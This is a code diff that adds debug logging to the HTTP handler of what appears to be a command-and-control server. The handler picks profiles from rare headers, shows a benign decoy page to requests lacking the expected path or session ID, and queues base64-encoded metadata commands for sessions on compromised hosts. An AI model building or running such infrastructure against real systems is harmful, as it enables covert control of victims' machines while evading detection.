@@ -77,15 +77,20 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 		If found and listener.profiles contains that name, parse & return
 		that profile.  Otherwise return the static listener.profile.
 		"""
+		logger.debug(brightblue + f"Searching listener {listener} for profiles" + reset)
 		profs = getattr(listener, "profiles", {}) or {}
+		logger.debug(brightblue + f"Found profiles {profs}" + reset)
 		for hdr in self.RARE_HEADERS:
 			val = self.headers.get(hdr)
 			if val and val in profs:
+				logger.debug(brightblue + f"Found profile header {hdr} with value {val} in profiles {profs}" + reset)
 				profile = profs[val]
 				#parsed = parse_malleable_profile(path)
 				if profile:
+					logger.debug(brightyellow + f"Successfully grabbed profile class {profile}" + reset)
 					return profile
 		# fallback to whatever the listener was started with
+		logger.debug(brightred + f"Returning none because no profile was found!" + reset)
 		return None
 
 	def _load_profile_block(self, name):
@@ -112,6 +117,7 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 				path = self.path.split("?", 1)[0]
 
 				if path != expected_uri:
+					logger.debug(brightred + f"Serving Benign page because path unexpected {path}, expected path: {expected_uri}" + reset)
 					return _serve_benign(self)
 
 				# extract our SID (same as before)…
@@ -121,6 +127,7 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					if sid:
 						break
 				if not sid:
+					logger.debug(brightred + f"Serving Benign page because no SID in get request" + reset)
 					return _serve_benign(self)
 
 				# handle new session / dead session exactly as you had it…
@@ -335,13 +342,18 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 			# dynamically pick profile per-request
 			profile = self._select_profile(listener)
+			logger.debug(brightyellow + f"Set profile to {profile}" + reset)
 
 			if profile:
+				logger.debug(brightblue + "Confirmed profile existence" + reset)
 				http_post     = profile.get_block("http-post")
 				expected_uri  = http_post.get("uri", "/")
 				path          = self.path.split("?", 1)[0]
 				if path != expected_uri:
+					logger.debug(brightred + f"Serving Benign page because path was unknown PATH: {path}, RIGHT PATH: {expected_uri}" + reset)
 					return _serve_benign(self)
+
+				logger.debug(brightblue + "Correct Path selected" + reset)
 
 				# pull session‐ID from any of our three headers
 				sid = None
@@ -352,6 +364,7 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 				if not sid:
 					# no C2 header → normal browser POST
+					logger.debug(brightred + f"Serving Benign page because no SID was sent" + reset)
 					return _serve_benign(self)
 
 				length = int(self.headers.get("Content-Length", 0))
@@ -404,10 +417,13 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 							session.detect_os(output)
 
 							# Queue OS-specific metadata commands
+							logger.debug(brightyellow + f"Enqueing metadata commands for {session.sid}" + reset)
 							for _, cmd in session.os_metadata_commands:
+								logger.debug(brightyellow + f"Enqued command {cmd} for {session.sid}" + reset)
 								encoded_meta_command = base64.b64encode(cmd.encode()).decode()
 								session.meta_command_queue.put(encoded_meta_command)
 
+							logger.debug(brightyellow + f"Setting metadata stage to 0, starting collection....")
 							session.mode = "metadata"
 							session.metadata_stage = 0
 							self.send_response(200)
